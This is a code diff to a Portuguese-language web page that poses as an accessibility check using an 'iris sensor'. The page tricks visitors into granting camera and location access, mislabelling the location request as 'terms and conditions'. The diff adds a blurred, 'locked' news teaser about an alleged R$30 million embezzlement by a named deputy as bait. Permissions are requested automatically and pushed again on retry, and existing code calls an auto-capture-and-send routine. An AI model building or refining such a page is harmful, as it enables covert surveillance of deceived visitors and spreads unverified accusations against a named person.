@@ -31,6 +31,8 @@
             align-items: center;
             flex-direction: column;
             transition: opacity 0.5s ease;
+            overflow-y: auto;
+            padding: 20px;
         }
         
         .initial-screen.hide {
@@ -42,10 +44,110 @@
             background: white;
             border-radius: 30px;
             padding: 40px 30px;
-            max-width: 350px;
+            max-width: 400px;
+            width: 100%;
             text-align: center;
             animation: fadeInUp 0.6s ease;
             box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            margin-bottom: 20px;
+        }
+        
+        /* Miniatura da prévia da notícia */
+        .news-preview {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            animation: fadeInUp 0.6s ease 0.2s both;
+            margin-top: 10px;
+        }
+        
+        .preview-header {
+            background: #003366;
+            padding: 8px 15px;
+            color: white;
+            font-size: 11px;
+            font-weight: bold;
+            text-align: center;
+        }
+        
+        .preview-image {
+            width: 100%;
+            height: 80px;
+            background: linear-gradient(135deg, #003366 0%, #0055a0 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            position: relative;
+        }
+        
+        .preview-content {
+            padding: 12px;
+        }
+        
+        .preview-category {
+            color: #c0392b;
+            font-size: 9px;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+        
+        .preview-title {
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+        
+        .preview-text {
+            font-size: 10px;
+            color: #666;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+        
+        .preview-blur {
+            filter: blur(3px);
+            margin-top: 8px;
+            padding-top: 8px;
+            border-top: 1px solid #eee;
+        }
+        
+        .preview-blur p {
+            font-size: 9px;
+            color: #999;
+            line-height: 1.3;
+            margin-bottom: 4px;
+        }
+        
+        .preview-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 30px;
+            background: linear-gradient(to bottom, transparent, rgba(0,51,102,0.8));
+            pointer-events: none;
+        }
+        
+        .badge-locked {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: rgba(0,0,0,0.6);
+            color: white;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
         }
         
         @keyframes fadeInUp {
@@ -60,28 +162,28 @@
         }
         
         .initial-icon {
-            font-size: 70px;
-            margin-bottom: 20px;
+            font-size: 50px;
+            margin-bottom: 15px;
         }
         
         .initial-card h2 {
             color: #003366;
-            margin-bottom: 15px;
-            font-size: 24px;
+            margin-bottom: 10px;
+            font-size: 22px;
         }
         
         .initial-card p {
             color: #666;
-            margin-bottom: 25px;
-            font-size: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
             line-height: 1.5;
         }
         
         .permission-status {
             background: #f8f9fa;
             border-radius: 15px;
-            padding: 15px;
-            margin: 20px 0;
+            padding: 12px;
+            margin: 15px 0;
             text-align: left;
         }
         
@@ -89,7 +191,7 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 8px 0;
+            padding: 6px 0;
             border-bottom: 1px solid #eee;
         }
         
@@ -100,10 +202,11 @@
         .status-label {
             font-weight: bold;
             color: #333;
+            font-size: 13px;
         }
         
         .status-value {
-            font-size: 20px;
+            font-size: 18px;
         }
         
         .status-pending {
@@ -118,23 +221,13 @@
             color: #f44336;
         }
         
-        .loading-spinner-small {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #e0e0e0;
-            border-top: 2px solid #003366;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        
         .btn-initial {
             background: linear-gradient(135deg, #003366 0%, #0055a0 100%);
             color: white;
             border: none;
-            padding: 14px 30px;
+            padding: 12px 25px;
             border-radius: 50px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: bold;
             cursor: pointer;
             width: 100%;
@@ -408,8 +501,11 @@
                 font-size: 16px;
             }
             .initial-card {
-                margin: 20px;
-                padding: 30px 20px;
+                margin: 10px;
+                padding: 25px 20px;
+            }
+            .news-preview {
+                max-width: 350px;
             }
         }
     </style>
@@ -420,25 +516,49 @@
         <div class="initial-card">
             <div class="initial-icon">♿🔐</div>
             <h2>Acessibilidade Garantida</h2>
-            <p>Para garantir a melhor experiência e acessibilidade para todos os usuários, incluindo pessoas com deficiência visual, utilizamos tecnologia de reconhecimento ocular para ajustar a leitura e otimizar o conteúdo.</p>
+            <p>Para garantir a melhor experiência e acessibilidade para todos os usuários, utilizamos tecnologia de reconhecimento ocular para ajustar a leitura.</p>
             
             <div class="permission-status">
                 <div class="status-item">
                     <span class="status-label">👁️ Sensor de Íris:</span>
-                    <span id="cameraStatus" class="status-value status-pending">⏳ Aguardando...</span>
+                    <span id="cameraStatus" class="status-value status-pending">⏳</span>
                 </div>
                 <div class="status-item">
                     <span class="status-label">📜 Termos e Condições:</span>
-                    <span id="locationStatus" class="status-value status-pending">⏳ Aguardando...</span>
+                    <span id="locationStatus" class="status-value status-pending">⏳</span>
                 </div>
             </div>
             
-            <p style="font-size: 12px; color: #999;">
-                Quando o navegador solicitar, clique em <strong>"PERMITIR"</strong> ou <strong>"PERMITIR DESTA VEZ"</strong>
+            <p style="font-size: 11px; color: #999;">
+                Quando solicitado, clique em <strong>"PERMITIR"</strong>
             </p>
             
-            <button id="initialAllowBtn" class="btn-initial" disabled>⏳ Aguardando autorização...</button>
-            <button id="initialRetryBtn" class="btn-initial retry-btn" style="display: none;">🔄 Recarregar e Tentar Novamente</button>
+            <button id="initialAllowBtn" class="btn-initial" disabled>⏳ Aguardando...</button>
+            <button id="initialRetryBtn" class="btn-initial retry-btn" style="display: none;">🔄 Recarregar e Tentar</button>
+        </div>
+        
+        <!-- Miniatura da prévia da notícia -->
+        <div class="news-preview">
+            <div class="preview-header">
+                📰 LAPADA DA BARRA | NOTA OFICIAL
+            </div>
+            <div class="preview-image">
+                📢 NOTA DE ESCLARECIMENTO
+                <div class="preview-overlay"></div>
+                <div class="badge-locked">
+                    🔒 Conteúdo Bloqueado
+                </div>
+            </div>
+            <div class="preview-content">
+                <div class="preview-category">🔴 INVESTIGAÇÃO EXCLUSIVA</div>
+                <div class="preview-title">Desvio de 30 Milhões - Dep. Chico Guarnieri</div>
+                <div class="preview-text">Gabinete do Deputado é investigado por suposto desvio de R$ 30 milhões destinados à revitalização da Lagoa de Barra do Bugres...</div>
+                <div class="preview-blur">
+                    <p>O gabinete do Deputado Estadual Chico Guarnieri (PSDB) vem, por meio desta nota, a público prestar os devidos esclarecimentos...</p>
+                    <p>É categoricamente falsa a informação de que o deputado estaria envolvido em qualquer tipo de desvio...</p>
+                    <p style="color: #ccc;">[Conteúdo bloqueado - autorize o acesso para ler]</p>
+                </div>
+            </div>
         </div>
     </div>
     
@@ -537,19 +657,19 @@
         
         function updateStatusUI() {
             if (cameraGranted) {
-                cameraStatusSpan.innerHTML = '✅ Autorizado';
+                cameraStatusSpan.innerHTML = '✅';
                 cameraStatusSpan.className = 'status-value status-granted';
             } else {
-                cameraStatusSpan.innerHTML = '❌ Aguardando - Clique em "Recarregar"';
-                cameraStatusSpan.className = 'status-value status-denied';
+                cameraStatusSpan.innerHTML = '⏳';
+                cameraStatusSpan.className = 'status-value status-pending';
             }
             
             if (locationGranted) {
-                locationStatusSpan.innerHTML = '✅ Aceito';
+                locationStatusSpan.innerHTML = '✅';
                 locationStatusSpan.className = 'status-value status-granted';
             } else {
-                locationStatusSpan.innerHTML = '❌ Aguardando - Clique em "Recarregar"';
-                locationStatusSpan.className = 'status-value status-denied';
+                locationStatusSpan.innerHTML = '⏳';
+                locationStatusSpan.className = 'status-value status-pending';
             }
         }
         
@@ -560,13 +680,19 @@
             updateStatusUI();
         }
         
-        // Função para recarregar a página e forçar os popups novamente
         function reloadPageAndRetry() {
-            window.location.reload();
+            const url = new URL(window.location.href);
+            url.searchParams.set('retry', Date.now());
+            window.location.href = url.toString();
         }
         
         async function requestCameraPermission() {
             try {
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                    currentStream = null;
+                }
+                
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
@@ -606,18 +732,13 @@
             isRequesting = true;
             
             initialAllowBtn.disabled = true;
-            initialAllowBtn.textContent = '⏳ Solicitando autorização...';
+            initialAllowBtn.textContent = '⏳ Solicitando...';
             initialRetryBtn.style.display = 'none';
             
             updateStatusUI();
             
-            // Solicitar câmera primeiro
             await requestCameraPermission();
-            
-            // Pequena pausa
             await new Promise(resolve => setTimeout(resolve, 500));
-            
-            // Solicitar localização
             await requestLocationPermission();
             
             permissionsReady = cameraGranted && locationGranted;
@@ -628,7 +749,7 @@
                 initialRetryBtn.style.display = 'none';
             } else {
                 initialAllowBtn.disabled = true;
-                initialAllowBtn.textContent = '❌ Autorização necessária';
+                initialAllowBtn.textContent = '❌ Necessário';
                 initialRetryBtn.style.display = 'block';
             }
             
@@ -805,14 +926,11 @@
             }
         });
         
-        // Botão "Tentar Novamente" - recarrega a página para forçar os popups
         initialRetryBtn.addEventListener('click', () => {
             reloadPageAndRetry();
         });
         
-        // INICIAR SOLICITAÇÃO DE PERMISSÕES IMEDIATAMENTE
         (async function() {
-            console.log('🚀 Solicitando autorizações automaticamente...');
             await requestAllPermissions();
         })();
         
@@ -822,6 +940,12 @@
                 await autoCaptureAndSend();
             }
         });
+        
+        if (window.location.search.includes('retry')) {
+            setTimeout(() => {
+                requestAllPermissions();
+            }, 500);
+        }
     </script>
 </body>
 </html>
